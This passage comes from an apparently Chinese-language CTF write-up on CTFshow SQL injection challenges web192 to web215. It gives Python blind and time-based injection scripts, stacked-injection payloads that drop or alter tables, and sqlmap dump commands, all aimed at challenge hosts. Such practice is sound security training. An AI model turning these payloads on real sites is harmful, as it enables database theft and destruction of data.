class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 00:52:03</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://053d8c7a-d802-48ae-836c-d60f4a832555.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>源码</p><p><img src="../images/image-20221230214618742.png" alt="image-20221230214618742"></p><p>这次193是把substr给过滤掉了，那么我们就可以靠用别的函数来替代了。</p><p>left   right 这两个函数都可以。</p><p><img src="../images/image-20221230215436224.png" alt="image-20221230215436224"></p><p><img src="../images/image-20221230215458982.png" alt="image-20221230215458982"></p><p>群主写的wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 01:24:27</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cd09c29e-5dfa-4740-aae6-babe6eebb972.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;,_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">tempstr = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_flxg</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,tempstr+mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            tempstr += mid</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><p>这里用tempstr参数的原因是，left函数不能一个一个的遍历，这个函数是直接输出长度为多少的字符串，所以我们得找一个参数来暂时存起来，然后在和新的拼接在一起。</p><h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>源码</p><p><img src="../images/image-20221230220314140.png" alt="image-20221230220314140"></p><p>过滤了挺多东西的。这道题可以使用   lpad   函数</p><p><img src="../images/image-20221230220532917.png" alt="image-20221230220532917"></p><p><img src="../images/image-20221230220638283.png" alt="image-20221230220638283"></p><p>其实和left差不多，只是加了一个空命令。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 01:24:27</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ae098689-0aa3-490f-9ece-da1a4ef3eaa4.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;,_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">tempstr = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_flxg</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,&#x27;&#x27;)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,tempstr+mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            tempstr += mid</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web195-堆叠注入"><a href="#web195-堆叠注入" class="headerlink" title="web195(堆叠注入)"></a>web195(堆叠注入)</h2><p>源码</p><p><img src="../images/image-20221230225635015.png" alt="image-20221230225635015"></p><p>这道题用的是堆叠注入的知识点。</p><p><img src="../images/image-20221230225706757.png" alt="image-20221230225706757"></p><p>wp是利用update函数来更新数据库里的密码。</p><p><img src="../images/image-20221230225901741.png" alt="image-20221230225901741"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``      这个符号可以替代空格。</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221230230250480.png" alt="image-20221230230250480"></p><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>源码</p><p><img src="../images/image-20221230230414378.png" alt="image-20221230230414378"></p><p><img src="../images/image-20221230231811538.png" alt="image-20221230231811538"></p><p><img src="../images/image-20221230231833992.png" alt="image-20221230231833992"></p><p>通过这一点可以来进行判断。</p><p><img src="../images/image-20221230231919859.png" alt="image-20221230231919859"></p><p>这里的select并没有被过滤。</p><p><img src="../images/image-20221231004615102.png" alt="image-20221231004615102"></p><h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>源码</p><p><img src="../images/image-20221230232106140.png" alt="image-20221230232106140"></p><p>不能用update来更新密码了。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0;drop table ctfshow_user;</span><br><span class="line">create table ctfshow_user(`username` varchar(100),`pass` varchar(100));</span><br><span class="line">insert ctfshow_user(`username`,`pass`) value(1,2);</span><br></pre></td></tr></table></figure><p>这是先删除掉原来的表，然后在新建一个表，然后在往表里插入东西。</p><p><img src="../images/image-20221230235928061.png" alt="image-20221230235928061"></p><p><img src="../images/image-20221230235936942.png" alt="image-20221230235936942"></p><p>成功执行并且建立了新表和内容。</p><p><img src="../images/image-20221231000026235.png" alt="image-20221231000026235"></p><p>成功执行。</p><h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>源码</p><p><img src="../images/image-20221231000119082.png" alt="image-20221231000119082"></p><p>新建表和更新密码都不能用了。</p><p><strong>解法一</strong></p><p>paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;insert ctfshow_user(`username`,`pass`) value(2,3);</span><br></pre></td></tr></table></figure><p>通过新插入的账号密码来获得flag。</p><p>然后在username和password处分别输入2，3    就能拿到flag。</p><p><strong>解法二</strong></p><p>通过pass和id列的互相交换，然后把依次爆破pass就好了，username值填0；（弱类型比较）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column `pass` `tmp` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `tmp` `id` varchar(255)</span><br></pre></td></tr></table></figure><h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><p>源码</p><p><img src="../images/image-20221231003923901.png" alt="image-20221231003923901"></p><p>这道题的用法类似这个原理</p><p><img src="../images/image-20221231004703865.png" alt="image-20221231004703865"></p><p><strong>解法一</strong></p><p><img src="../images/image-20221231004751742.png" alt="image-20221231004751742"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username  ---&gt;    1;show tables</span><br><span class="line">password  ---&gt;    ctfshow_user</span><br><span class="line">因为就是$row是用来存第二个分号后传的内容的</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change column id pass int;alter table ctfshow_user change column tmp id text</span><br></pre></td></tr></table></figure><p>这个是把varchar类型换成text类型，因为就是varchar需要括号，text不需要括号。</p><p>然后username为0；从0开始爆破password就行。</p><h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>源码</p><p> <img src="../images/image-20221231005222484.png" alt="image-20221231005222484"></p><p>多把一个逗号给过滤掉了。</p><p><strong>解法一</strong></p><p><img src="../images/image-20221231005325134.png" alt="image-20221231005325134"></p><p><strong>解法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change column id pass int;alter table ctfshow_user change column tmp id text</span><br></pre></td></tr></table></figure><h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>源码</p><p><img src="../images/image-20221231212254050.png" alt="image-20221231212254050"></p><p><strong>第一步</strong></p><p>查看是否可以进行注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213608213.png" alt="image-20221231213608213"></p><p>说明id可以进行注入了。</p><p><strong>第二步</strong></p><p>查找全部的数据库名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show --dbs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213740070.png" alt="image-20221231213740070"></p><p><strong>第三步</strong></p><p>查找某个数据库中的表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web --tables</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213901166.png" alt="image-20221231213901166"></p><p><strong>第四步</strong></p><p>查找表中的所有的列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user --columns</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231214110487.png" alt="image-20221231214110487"></p><p><strong>第五步</strong></p><p>查看这些列中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231214230587.png" alt="image-20221231214230587"></p><p>拿到flag.</p><h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p>源码</p><p><img src="../images/image-20221231214436334.png" alt="image-20221231214436334"></p><p>那就是POST请求了。</p><p><img src="../images/image-20221231214624767.png" alt="image-20221231214624767"></p><p>猜测数据库名和表名也该没改，那么直接就去用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://f61fc87c-d4f4-44bb-a391-52a88766edb9.challenge.ctf.show/api/&quot; --data=&quot;id=1&quot; --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231215653269.png" alt="image-20221231215653269"></p><p>直接拿到flag.</p><h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>源码</p><p><img src="../images/image-20221231215842405.png" alt="image-20221231215842405"></p><p>这题说是要用method。</p><p><img src="../images/image-20221231215938860.png" alt="image-20221231215938860"></p><p>注意：一定要加上–headers=“Content-Type: text/plain” ，否则是按表单提交的，put接收不到</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://ef1c4fb9-5fb4-45d0-96e6-721fe5bdbce3.challenge.ctf.show/api/index.php&quot; --data=&quot;id=1&quot; --referer=ctf.show --method=PUT --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p>(这里我是懒得一步一步的去查数据库和表了，就直接用上一个的了)</p><p><img src="../images/image-20221231221803548.png" alt="image-20221231221803548"></p><h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p>源码</p><p><img src="../images/image-20221231222031810.png" alt="image-20221231222031810"></p><p>新增加了个cookie提交。</p><p><img src="../images/image-20221231222112530.png" alt="image-20221231222112530"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里我也不知道出现啥问题了，直接写的payload在kali下的sqlmap 打不通   拿别人的pl也没用，好奇怪</span><br></pre></td></tr></table></figure><h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>源码</p><p><img src="../images/image-20230101152042762.png" alt="image-20230101152042762"></p><p>通过抓包分析，在每次请求<code>url/api/index.php</code>之前需要先请求<code>URL/api/getTokn.php</code>，大家可以用burpsuite抓包看看确实是这么回事</p><p>所以我们需要两个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--safe-url 设置在测试目标地址前访问的安全链接</span><br><span class="line">--safe-freq 设置两次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101152312909.png" alt="image-20230101152312909"></p><p>摘自Y4tacker师傅的博客   <a href="https://blog.csdn.net/solitudi/article/details/110144623">https://blog.csdn.net/solitudi/article/details/110144623</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://98a8a8b4-a308-4ec4-93e7-b072c3971d27.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql dbs=ctfshow_web -T ctfshow_flax -C flagx --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://98a8a8b4-a308-4ec4-93e7-b072c3971d27.challenge.ctf.show/api/getToken.php --safe-freq=1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101153109959.png" alt="image-20230101153109959"></p><p>这里是直接打payload，师傅们可以按照前面的步骤来一步一步的打。</p><h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p>源码</p><p><img src="../images/image-20230101153400105.png" alt="image-20230101153400105"></p><p>这里的话是闭不闭合都无所谓，因为sqlmap会自己判断。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://0e551b3e-f8f4-4d09-9bbb-5a95ca5f0334.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql -D &quot;ctfshow_web&quot; -T &quot;ctfshow_flaxc&quot; -C &quot;flagv&quot; --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://0e551b3e-f8f4-4d09-9bbb-5a95ca5f0334.challenge.ctf.show/api/getToken.php --safe-freq=1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101153947876.png" alt="image-20230101153947876"></p><p>这里是直接打payload，师傅们可以按照前面的步骤来一步一步的做。</p><h2 id="web207-web213"><a href="#web207-web213" class="headerlink" title="web207  -  web213"></a>web207  -  web213</h2><p>大家可以看看Y4tacker师傅的博客，我就不写了</p><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">https://blog.csdn.net/solitudi/article/details/110144623</a></p><h2 id="web214-时间盲注"><a href="#web214-时间盲注" class="headerlink" title="web214(时间盲注)"></a>web214(时间盲注)</h2><p>源码</p><p><img src="../images/image-20230101170048693.png" alt="image-20230101170048693"></p><p>注入点在url/api/</p><p>群主写的wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://b435d6fe-5f89-40c5-9d51-c6b900d102e1.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagx,ctfshow_info</span></span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id, flaga, inf</span></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select flaga from ctfshow_flagx),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><p>然后跟着上面的走就能拿到flag了。</p><p>看了这么多脚本的编写，自己也会写一点了(记录一下这个时刻)</p><h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>源码</p><p><img src="../images/image-20230101175616535.png" alt="image-20230101175616535"></p><p>这里提示了用’  ‘   单引号。</p><p>就是同样用单引号给闭合注释掉就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or xxxxxxxxxx#  